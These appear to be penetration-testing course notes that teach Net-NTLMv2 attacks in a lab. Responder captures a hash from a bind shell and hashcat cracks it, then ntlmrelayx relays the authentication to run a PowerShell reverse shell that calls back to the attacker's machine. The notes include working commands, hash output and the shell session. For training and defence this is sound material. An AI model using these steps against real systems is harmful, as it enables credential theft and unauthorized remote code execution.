+ In this example, our goal is to gain access to an SMB share on a Windows 2022 server from a Windows 11 client via Net-NTLMv2

At a high level, we'll send the server a request, outlining the connection details to access the SMB share
+ Then the server will send us a challenge in which we encrypt data for our response with our NTLM hash to prove our identity
+ The server will then check our challenge response and either grant or deny access, accordingly

However, our specific goal is to use Net-NTLMv2 for this exercise since it is less secure than the more modern _Kerberos_ protocol
+ This is common in the real-world since the majority of Windows environments still rely on the older protocol, especially as a way to support older devices that may not support Kerberos

Since we'll find Net-NTLMv2 in nearly all Windows networks and environments, it is vital to understand how we can abuse its weaknesses
+ To do this, we need our target to start an authentication process using Net-NTLMv2 against a system we control
+ We need to prepare our system so that it handles the authentication process and shows us the Net-NTLMv2 hash the target used to authenticate

The <mark style="background: #D2B3FFA6;">Responder</mark> tool is excellent for this
+ It includes a built-in SMB server that handles the authentication process for us and prints all captured Net-NTLMv2 hashes
+ While it also includes other protocol servers (including HTTP and FTP) as well as _Link-Local Multicast Name Resolution_ (LLMNR),  _NetBIOS Name Service_ (NBT-NS), and _Multicast DNS_ (MDNS) poisoning capabilities, we'll focus on capturing Net-NTLMv2 hashes with the SMB server in this section

If we've obtained code execution on a remote system, we can easily force it to authenticate with us by commanding it to connect to our prepared SMB server
+ For example, we can simply run **ls \\192.168.119.2\share** in PowerShell (assuming our Responder is listening on that IP).
+ If we don't have code execution, we can also use other vectors to force an authentication
+ For example, when we discover a file upload form in a web application on a Windows server, we can try to enter a non-existing file with a UNC path like **\\192.168.119.2\share\nonexistent.txt**
+ If the web application supports uploads via SMB, the Windows server will authenticate to our SMB server

Let's capture and crack a Net-NTLMv2 hash
+ We'll set up Responder on our Kali machine as an SMB server and use FILES01 (at 192.168.50.211) as the target
+ Let's assume we used an attack vector to execute a bind shell on the target system
+ We'll connect to port 4444 with Netcat where our bind shell is running
+ After we successfully connect, we'll use **whoami** to check which user is running the bind shell
+ We'll then use the **net user** command to check if the user is a member of the local _Administrators_ group
```
kali@kali:~$ nc 192.168.50.211 4444
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32> whoami
whoami
files01\paul

C:\Windows\system32> net user paul
net user paul
User name                    paul
Full Name                    paul power
Comment                      
User's comment               
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            6/3/2022 10:05:27 AM
Password expires             Never
Password changeable          6/3/2022 10:05:27 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script                 
User profile                 
Home directory               
Last logon                   6/3/2022 10:29:19 AM

Logon hours allowed          All

Local Group Memberships      *Remote Desktop Users *Users                
Global Group memberships     *None                 
The command completed successfully.
```

The output shows the bind shell runs as the user _paul_, which is not a local administrator on the FILES01 system
+ Interestingly, the _paul_ user is a member of the _Remote Desktop Users_ group, which allows the user to connect to the system with RDP

For the sake of this demonstration, let's assume the user _gunther_ (which we used in the previous section) does not exist or we don't have access to the account
+ In this case, we only have access to _paul_ on this system

Since we don't have privileges to run Mimikatz, we cannot extract passwords from the system
+ But we can set up an SMB server with Responder on our Kali machine, then connect to it with the user _paul_ and crack the Net-NTLMv2 hash, which is used in the authentication process

Let's do this now. First, we'll need to run **ip a** to retrieve a list of all interfaces
+ Then, we'll run **responder** (which is already pre-installed on Kali) as **sudo** to enable permissions needed to handle privileged raw socket operations for the various protocols
+ We'll set the listening interface with **-I**, noting that your interface name may differ from what's shown here
+ Usage:
```
sudo responder -I <INTERFACE>
``` 
+ Example Usage and Output:
```
kali@kali:~$ ip a
...
3: tap0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UNKNOWN group default qlen 1000
    link/ether 42:11:48:1b:55:18 brd ff:ff:ff:ff:ff:ff
    inet 192.168.119.2/24 scope global tap0
       valid_lft forever preferred_lft forever
    inet6 fe80::4011:48ff:fe1b:5518/64 scope link 
       valid_lft forever preferred_lft forever

kali@kali:~$ sudo responder -I tap0 
                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.1.1.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C
...
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
...
[+] Listening for events... 
```
+ The output shows that Responder is now listening for events and the SMB server is active

Our next step is to request access to a non-existent SMB share on our Responder SMB server using _paul_'s bind shell
+ We'll do this with a simple **dir** listing of **`\\192.168.119.2\test`**, in which "test" is an arbitrary directory name
+ We are only interested in the authentication process, not a share listing

Let's switch back to the terminal tab containing our Netcat bind shell connection and enter the command:
```
C:\Windows\system32>dir \\192.168.119.2\test
dir \\192.168.119.2\test
Access is denied.
```

The Responder tab should show the following:
```
...
[+] Listening for events... 
[SMB] NTLMv2-SSP Client   : ::ffff:192.168.50.211
[SMB] NTLMv2-SSP Username : FILES01\paul
[SMB] NTLMv2-SSP Hash     : paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E004800550058004300340054004900430004003400570049004E002D00340044004E00480055005800430034005400490043002E00360057004D0052002E004C004F00430041004C0003001400360057004D0052002E004C004F00430041004C0005001400360057004D0052002E004C004F00430041004C000700080000B050CD1777D801060004000200000008003000300000000000000000000000002000008BA7AF42BFD51D70090007951B57CB2F5546F7B599BC577CCD13187CFC5EF4790A001000000000000000000000000000000000000900240063006900660073002F003100390032002E003100360038002E003100310038002E0032000000000000000000 
```

This indicates that Responder successfully captured _paul_'s Net-NTLMv2 hash
+ We'll save this to **paul.hash** so we can crack it with Hashcat
+ Before we start cracking, let's retrieve the correct mode
```
kali@kali:~$ cat paul.hash   
paul::FILES01:1f9d4c51f6e74653:795F138EC69C274D0FD53BB32908A72B:010100000000000000B050CD1777D801B7585DF5719ACFBA0000000002000800360057004D00520001001E00570049004E002D00340044004E00480055005800430034005400490043000400340057...

kali@kali:~$ hashcat --help | grep -i "ntlm"
   5500 | NetNTLMv1 / NetNTLMv1+ESS                           | Network Protocol
  27000 | NetNTLMv1 / NetNTLMv1+ESS (NT)                      | Network Protocol
   5600 | NetNTLMv2                                           | Network Protocol
  27100 | NetNTLMv2 (NT)                                      | Network Protocol
   1000 | NTLM                                                | Operating System
```

This file contains _paul_'s captured Net-NTLMv2 hash (which is cropped in this Listing) and according to Hashcat, it is mode 5600 ("NetNTLMv2")
+ Now let's attempt to crack the hash using the **rockyou.txt** wordlist
```
kali@kali:~$ hashcat -m 5600 paul.hash /usr/share/wordlists/rockyou.txt --force
hashcat (v6.2.5) starting
...

PAUL::FILES01:1f9d4c51f6e74653:795f138ec69c274d0fd53bb32908a72b:010100000000000000b050cd1777d801b7585df5719acfba0000000002000800360057004d00520001001e00570049004e002d00340044004e004800550058004300340054004900430004003400570049004e002d00340044004e00480055005800430034005400490043002e00360057004d0052002e004c004f00430041004c0003001400360057004d0052002e004c004f00430041004c0005001400360057004d0052002e004c004f00430041004c000700080000b050cd1777d801060004000200000008003000300000000000000000000000002000008ba7af42bfd51d70090007951b57cb2f5546f7b599bc577ccd13187cfc5ef4790a001000000000000000000000000000000000000900240063006900660073002f003100390032002e003100360038002e003100310038002e0032000000000000000000:123Password123
...
```
+ The listing shows that we successfully cracked _paul_'s Net-NTLMv2 hash
+ Let's confirm that the password is valid by connecting to FILES01 with RDP
![[Pasted image 20231107155650.png]]
+ Above shows that we successfully connected to FILES01 with RDP as _paul_

### Relaying Net-NTLMv2
In this section, we'll have access to FILES01 as an unprivileged user (_files02admin_), which means we cannot run Mimikatz to extract passwords
+ Using the steps from the previous section, imagine we obtained the Net-NTLMv2 hash, but couldn't crack it because it was too complex

What we can assume based on the username is that the user may be a local administrator on FILES02
+ Therefore, we can try to use the hash on another machine in what is known as a _relay attack_

In this attack, we'll again use the _dir_ command in the bind shell to create an SMB connection to our Kali machine
+ Instead of merely printing the Net-NTLMv2 hash used in the authentication step, we'll forward it to FILES02
+ If _files02admin_ is a local user of FILES02, the authentication is valid and therefore accepted by the machine
+ If the relayed authentication is from a user with local administrator privileges, we can use it to authenticate and then execute commands over SMB with methods similar to those used by psexec or wmiexec
+ **NOTE**: In this example we don't use the local _Administrator_ user for the relay attack as we did for the pass-the-hash attack. Therefore, the target system needs to have UAC remote restrictions disabled or the command execution will fail. If UAC remote restrictions are enabled on the target then we can only use the local _Administrator_ user for the relay attack

We'll perform this attack with _ntlmrelayx_, another tool from the impacket library
+ This tool does the heavy lifting for us by setting up an SMB server and relaying the authentication part of an incoming SMB connection to a target of our choice

Let's get right into the attack by starting ntlmrelayx, which we can use with the pre-installed **impacket-ntlmrelayx** package
+ We'll use **--no-http-server** to disable the HTTP server since we are relaying an SMB connection and **-smb2support** to add support for _SMB2_
+ We'll also use **-t** to set the target to FILES02. Finally, we'll set our command with **-c**, which will be executed on the target system as the relayed user
+ We'll use a PowerShell reverse shell one-liner, which we'll base64-encode and execute with the **-enc** argument as we've done before in this course
+ We should note that the base64-encoded PowerShell reverse shell one-liner is shortened in the following listing, but it uses the IP of our Kali machine and port 8080 for the reverse shell to connect
```
kali@kali:~$ impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.50.212 -c "powershell -enc JABjAGwAaQBlAG4AdA..." 
Impacket v0.9.24 - Copyright 2021 SecureAuth Corporation
...
[*] Protocol Client SMB loaded..
[*] Protocol Client IMAPS loaded..
[*] Protocol Client IMAP loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up WCF Server
[*] Setting up RAW Server on port 6666

[*] Servers started, waiting for connections
```

Next, we'll start a Netcat listener on port 8080 (in a new terminal tab) to catch the incoming reverse shell
```
kali@kali:~$ nc -nvlp 8080 
listening on [any] 8080 ...
```

Now we'll run Netcat in another terminal to connect to the bind shell on FILES01 (port 5555)
+ After we connect, we'll enter **`dir \\192.168.119.2\test`** to create an SMB connection to our Kali machine. Again, the remote folder name is arbitrary
```
kali@kali:~$  nc 192.168.50.211 5555                                       
Microsoft Windows [Version 10.0.20348.707]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
files01\files02admin

C:\Windows\system32>dir \\192.168.119.2\test
...
```

We should receive an incoming connection in our ntlmrelayx tab
```
[*] SMBD-Thread-4: Received connection from 192.168.50.211, attacking target smb://192.168.50.212
[*] Authenticating against smb://192.168.50.212 as FILES01/FILES02ADMIN SUCCEED
[*] SMBD-Thread-6: Connection from 192.168.50.211 controlled, but there are no more targets left!
...
[*] Executed specified command on host: 192.168.50.212
```

The output indicates that ntlmrelayx received an SMB connection and used it to authenticate to our target by relaying it 
+ After successfully authenticating, our command was executed on the target
+ Our Netcat listener should have caught the reverse shell
```
connect to [192.168.119.2] from (UNKNOWN) [192.168.50.212] 49674
whoami
nt authority\system

PS C:\Windows\system32> hostname
FILES02

PS C:\Windows\system32> ipconfig

Windows IP Configuration


Ethernet adapter Ethernet0:

   Connection-specific DNS Suffix  . : 
   Link-local IPv6 Address . . . . . : fe80::7992:61cd:9a49:9046%4
   IPv4 Address. . . . . . . . . . . : 192.168.50.212
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.50.254
```
+ Above shows that we could leverage a relay attack to get code execution on FILES02


